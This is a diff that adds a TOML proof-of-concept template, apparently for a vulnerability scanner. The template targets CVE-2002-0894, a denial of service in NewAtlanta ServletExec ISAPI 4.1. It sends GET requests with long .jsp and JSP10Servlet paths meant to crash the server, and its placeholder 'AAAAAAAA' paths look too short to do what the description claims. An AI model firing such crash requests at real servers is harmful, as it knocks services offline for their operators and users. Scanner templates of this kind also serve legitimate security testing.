@@ -1,0 +1,50 @@
+[info]
+author = "AVE"
+description = "通过向 ServletExec ISAPI 4.1 发送超长 .jsp 路径请求或超长 URL 到 JSP10Servlet，触发服务器崩溃导致拒绝服务"
+id = "POC-AVE-2002-0463"
+name = "NewAtlanta ServletExec ISAPI 4.1 JSPServlet 拒绝服务 PoC"
+severity = "medium"
+tags = ["ave-2002-0463"]
+vuln_id = [
+    "CVE-2002-0894",
+    "AVE-2002-0463",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/AAAAAAAA.jsp"
+protocol = "http"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "Connection refused",
+    "No route to host",
+    "timeout",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/servlet/com.newatlanta.servletexec.JSP10Servlet/AAAAAAAA"
+protocol = "http"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "Connection refused",
+    "No route to host",
+    "timeout",
+]
